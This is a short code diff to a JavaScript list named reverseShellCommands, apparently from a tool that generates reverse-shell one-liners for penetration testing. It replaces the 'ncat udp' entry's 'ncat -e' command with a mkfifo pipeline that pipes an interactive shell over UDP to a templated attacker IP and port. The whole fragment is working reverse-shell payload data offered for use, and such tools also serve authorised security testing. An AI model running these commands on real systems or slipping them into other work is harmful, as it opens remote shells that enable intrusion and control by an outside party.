@@ -76,7 +76,7 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "ncat udp",
-            "command": "ncat {ip} {port} -e {shell}",
+            "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",
             "meta": ["linux", "mac"]
         },
         {
